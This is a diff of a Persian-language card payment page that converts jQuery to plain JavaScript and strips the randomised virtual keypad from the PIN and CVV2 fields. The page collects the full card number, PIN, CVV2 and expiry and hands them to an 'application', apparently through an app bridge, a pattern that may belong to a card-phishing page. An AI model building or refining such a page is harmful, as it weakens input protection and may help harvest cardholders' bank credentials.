@@ -13,7 +13,6 @@
     <link href="css/bootstrap-rtl.css" rel="stylesheet">
     <link href="css/bootstrapConfig.css" rel="stylesheet">
     <link href="css/AQ4.css" rel="stylesheet">
-    <script src="js/jquery-3.js"></script>
     <script src="js/dtx-no-back.js"></script>
     <script src="js/angular.js"></script>
     <script src="js/metisMenu.js"></script>
@@ -140,7 +139,7 @@
                                     <div class="col-xs-12">
                                         <div class="form-group form-inline pay-main-col-002">
                                             <label>رمز دوم کارت (رمز اینترنتی)</label>
-                                            <input id="pin" name="pin" class="form-control ltr number paymentField pull-left keypad is-keypad" maxlength="12" tabindex="5" autocomplete="off" type="password">
+                                            <input id="pin" name="pin" class="form-control ltr number paymentField pull-left" maxlength="12" tabindex="5" autocomplete="off" type="password">
                                             <p class="help-block">لطفاً از صحت رمز عبور خود مطمئن شوید</p>
                                         </div>
                                     </div>
@@ -149,7 +148,7 @@
                                     <div class="col-xs-12">
                                         <div class="form-group form-inline pay-main-col-003">
                                             <label>کد سه یا چهار رقمی (CVV2)</label>
-                                            <input id="cvv2" name="cvv2" class="form-control ltr number paymentField pull-left keypad is-keypad" maxlength="4" tabindex="6" autocomplete="off" type="password">
+                                            <input id="cvv2" name="cvv2" class="form-control ltr number paymentField pull-left" maxlength="4" tabindex="6" autocomplete="off" type="password">
                                         </div>
                                     </div>
                                 </div>
@@ -264,7 +263,7 @@
     </div>
 
     <script>
-        $(document).ready(function () {
+        document.addEventListener('DOMContentLoaded', function () {
             // Timer
             let minutes = 10, seconds = 0;
             const referer = '../../';
@@ -276,11 +275,12 @@
                     seconds = 59;
                 } else {
                     clearInterval(timerInterval);
-                    $('#displayTimeRemaining').html('EXPIRED');
+                    document.getElementById('displayTimeRemaining').textContent = 'EXPIRED';
                     if (referer) window.location = referer;
                     return;
                 }
-                $('#displayTimeRemaining').html(`${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`);
+                document.getElementById('displayTimeRemaining').textContent = 
+                    `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
             }, 1000);
 
             // CAPTCHA generation
@@ -304,62 +304,112 @@
                 }
             }
             generateCaptcha();
-            $('#btnRefreshCaptcha').click(() => generateCaptcha());
+            document.getElementById('btnRefreshCaptcha').addEventListener('click', generateCaptcha);
 
             // Input validation and restrictions
-            $('.paymentField').on('cut copy paste', e => e.preventDefault());
-            $('.number').keydown(e => {
-                if (e.ctrlKey || e.shiftKey) {
-                    if ([9, 37, 39, 45].includes(e.keyCode)) return;
-                    e.preventDefault();
-                } else {
-                    if ([8, 9, 37, 39, 46].includes(e.keyCode) || (e.keyCode >= 48 && e.keyCode <= 57) || (e.keyCode >= 96 && e.keyCode <= 105)) return;
-                    e.preventDefault();
-                }
+            const paymentFields = document.querySelectorAll('.paymentField');
+            paymentFields.forEach(field => {
+                field.addEventListener('paste', e => e.preventDefault());
+                field.addEventListener('copy', e => e.preventDefault());
+                field.addEventListener('cut', e => e.preventDefault());
+                field.addEventListener('keydown', e => {
+                    if (e.ctrlKey || e.shiftKey) {
+                        if ([9, 37, 39, 45].includes(e.keyCode)) return;
+                        e.preventDefault();
+                    } else {
+                        if ([8, 9, 37, 39, 46].includes(e.keyCode) || 
+                            (e.keyCode >= 48 && e.keyCode <= 57) || 
+                            (e.keyCode >= 96 && e.keyCode <= 105)) return;
+                        e.preventDefault();
+                    }
+                });
             });
 
             // Auto-focus next/previous field
-            $('.paymentField').keydown(function (e) {
-                const tabIndex = parseInt($(this).attr('tabindex'));
-                const value = $(this).val();
-                const maxLength = parseInt($(this).attr('maxlength'));
-                if (((e.keyCode >= 48 && e.keyCode <= 57) || (e.keyCode >= 96 && e.keyCode <= 105)) && value.length >= maxLength && tabIndex < 9) {
-                    $(`.paymentField[tabindex="${tabIndex + 1}"]`).focus();
-                } else if (e.keyCode === 8 && value.length === 0 && tabIndex > 1) {
-                    $(`.paymentField[tabindex="${tabIndex - 1}"]`).focus();
-                }
+            paymentFields.forEach(field => {
+                field.addEventListener('keydown', function (e) {
+                    const tabIndex = parseInt(this.getAttribute('tabindex'));
+                    const value = this.value;
+                    const maxLength = parseInt(this.getAttribute('maxlength'));
+                    if (((e.keyCode >= 48 && e.keyCode <= 57) || (e.keyCode >= 96 && e.keyCode <= 105)) && 
+                        value.length >= maxLength && tabIndex < 9) {
+                        const nextField = document.querySelector(`.paymentField[tabindex="${tabIndex + 1}"]`);
+                        if (nextField) nextField.focus();
+                    } else if (e.keyCode === 8 && value.length === 0 && tabIndex > 1) {
+                        const prevField = document.querySelector(`.paymentField[tabindex="${tabIndex - 1}"]`);
+                        if (prevField) prevField.focus();
+                    }
+                });
             });
 
-            // Virtual keypad
-            $('.keypad').keypad({ showAnim: '', keypadOnly: false, randomiseNumeric: true });
-
             // Form submission
-            $('#paymentButton').click(() => {
+            document.getElementById('paymentButton').addEventListener('click', () => {
                 const fields = {
-                    part1: $('#Part1').val(),
-                    part2: $('#Part2').val(),
-                    part3: $('#Part3').val(),
-                    part4: $('#Part4').val(),
-                    pin: $('#pin').val(),
-                    cvv2: $('#cvv2').val(),
-                    month: $('#month').val(),
-                    year: $('#year').val(),
-                    captcha: $('#captchaInput').val()
+                    part1: document.getElementById('Part1').value,
+                    part2: document.getElementById('Part2').value,
+                    part3: document.getElementById('Part3').value,
+                    part4: document.getElementById('Part4').value,
+                    pin: document.getElementById('pin').value,
+                    cvv2: document.getElementById('cvv2').value,
+                    month: document.getElementById('month').value,
+                    year: document.getElementById('year').value,
+                    captcha: document.getElementById('captchaInput').value
                 };
 
                 // Validation
-                $('#alert-fan').hide();
-                $('#alert-fan li').hide();
-                if (!fields.part1) return $('#alert-fan, #inpart1').show();
-                if (!fields.part2) return $('#alert-fan, #inpart2').show();
-                if (!fields.part3) return $('#alert-fan, #inpart3').show();
-                if (!fields.part4) return $('#alert-fan, #inpart4').show();
-                if (!fields.pin) return $('#alert-fan, #int-check').show();
-                if (!fields.cvv2) return $('#alert-fan, #cvv2-check').show();
-                if (!fields.month) return $('#alert-fan, #month-check').show();
-                if (!fields.year) return $('#alert-fan, #year-check').show();
-                if (!fields.captcha) return $('#alert-fan, #captcha-check').show();
-                if (fields.captcha !== captchaCode) return $('#alert-fan, #captcha-invalid').show();
+                const alertFan = document.getElementById('alert-fan');
+                alertFan.style.display = 'none';
+                document.querySelectorAll('#alert-fan li').forEach(li => li.style.display = 'none');
+                if (!fields.part1) {
+                    alertFan.style.display = 'block';
+                    document.getElementById('inpart1').style.display = 'block';
+                    return;
+                }
+                if (!fields.part2) {
+                    alertFan.style.display = 'block';
+                    document.getElementById('inpart2').style.display = 'block';
+                    return;
+                }
+                if (!fields.part3) {
+                    alertFan.style.display = 'block';
+                    document.getElementById('inpart3').style.display = 'block';
+                    return;
+                }
+                if (!fields.part4) {
+                    alertFan.style.display = 'block';
+                    document.getElementById('inpart4').style.display = 'block';
+                    return;
+                }
+                if (!fields.pin) {
+                    alertFan.style.display = 'block';
+                    document.getElementById('int-check').style.display = 'block';
+                    return;
+                }
+                if (!fields.cvv2) {
+                    alertFan.style.display = 'block';
+                    document.getElementById('cvv2-check').style.display = 'block';
+                    return;
+                }
+                if (!fields.month) {
+                    alertFan.style.display = 'block';
+                    document.getElementById('month-check').style.display = 'block';
+                    return;
+                }
+                if (!fields.year) {
+                    alertFan.style.display = 'block';
+                    document.getElementById('year-check').style.display = 'block';
+                    return;
+                }
+                if (!fields.captcha) {
+                    alertFan.style.display = 'block';
+                    document.getElementById('captcha-check').style.display = 'block';
+                    return;
+                }
+                if (fields.captcha !== captchaCode) {
+                    alertFan.style.display = 'block';
+                    document.getElementById('captcha-invalid').style.display = 'block';
+                    return;
+                }
 
                 // Combine card number parts
                 const cardNumber = fields.part1 + fields.part2 + fields.part3 + fields.part4;
@@ -373,7 +423,7 @@
                         expiryMonth: fields.month,
                         expiryYear: fields.year
                     }));
-                    $('#paymentButton').html('لطفا کمی صبر کنید');
+                    document.getElementById('paymentButton').textContent = 'لطفا کمی صبر کنید';
                 } else {
                     alert('ارتباط با اپلیکیشن برقرار نشد');
                 }
@@ -381,4 +431,4 @@
         });
     </script>
 </body>
-</html>
+                                                </html>
